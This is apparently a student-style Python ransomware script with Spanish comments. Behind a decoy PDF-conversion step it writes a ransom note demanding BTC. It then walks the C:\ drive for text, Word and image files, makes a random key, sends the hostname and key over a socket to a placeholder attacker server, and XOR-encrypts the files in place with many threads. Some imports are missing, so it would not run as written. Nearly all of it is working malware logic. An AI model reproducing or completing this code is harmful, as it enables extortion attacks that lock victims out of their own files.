import os
import random
import socket
from fpdf import FPDF
import aspose.words as aw

#---------------------FUNCIONALIDAD "LEGITIMA"----------------------
#SAFEGUARD para no correr el programa por accidente = 'si'
safeguard = input('Desea convertir a PDF?("si" / otra tecla para no): \t')  
if safeguard != 'si':
	quit()

pdf = FPDF()
  
# Agregar pagina
pdf.add_page()
  
# estilo y tamaño de fuente 
pdf.set_font("Arial", size = 12)
  
# Load word document
readInput = input("Inserte nombre del archivo: ")
# create a cell
pdf.cell(200, 10, txt = "¿QUÉ LE PASÓ A MI COMPUTADORA?", 
         ln = 1, align = 'C')
  
# add another cell
pdf.cell(200, 10, txt = "Ha sido víctima de ransomware, pague X dólares en BTC para liberar sus archivos",
         ln = 2, align = 'C')
  
# save the pdf with name .pdf
pdf.output("SALVARCOMPUTADORA.pdf") 
#--------------------------------------------------------------------

#Extensiones a cifrar
encrypted_ext = ('.txt','docx','png','jpg')

#Tomar archivos de la máquina
file_paths = []
for root, dirs, files in os.walk('C:\\'):
	for file in files:
		file_path, file_ext = os.path.splitext(root+'\\'+file)
		if file_ext in encrypted_ext:
			file_paths.append(root+'\\'+file)

#Generar llave
key = ''
encryption_level = 128 // 8
char_pool = ''
for i in range(0x00, 0xFF):
	char_pool += (chr(i))
for i in range(encryption_level):
	key += random.choice(char_pool)

#nombre del host(victima)
hostname = os.getenv('COMPUTERNAME')

#Conectarse a servidor de ransomware para enviar nombre del host y llave
ip_address = '127.0.0.1' #CAMBIAR POR DIRECCIÓN DEL SERVIDOR AL QUE SE ENVIA
port = 3141
ttime = datetime.now()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	s.connect((ip_address, port))
	s.send(f'[{ttime}] - {hostname}: {key}'.encode('utf-8'))

#Cifrar archivos
def encrypt(key):
	while q.not_empty:
		file = q.get()
		index = 0
		max_index = encryption_level - 1
		try:
			with open(file, 'rb') as f:
				data = f.read()
			with open(file, 'wb') as f:
				for byte in data:
					xor_byte = byte ^ ord(key[index])
					f.write(xor_byte.to_bytes(1,'little'))
					if index >= max_index:
						index = 0
					else:
						index += 1
		except: #En caso de que no se pueda cifrar (generalmente por no tener acceso como administrador)
			print(f'Failed to encrypt {file}')
			q.task_done()

q = Queue()
for file in file_paths:
	q.put(file)
for i in range(30):
	thread = Thread(target = encrypt, args=(key,), daemon = True)
	thread.start()

q.join()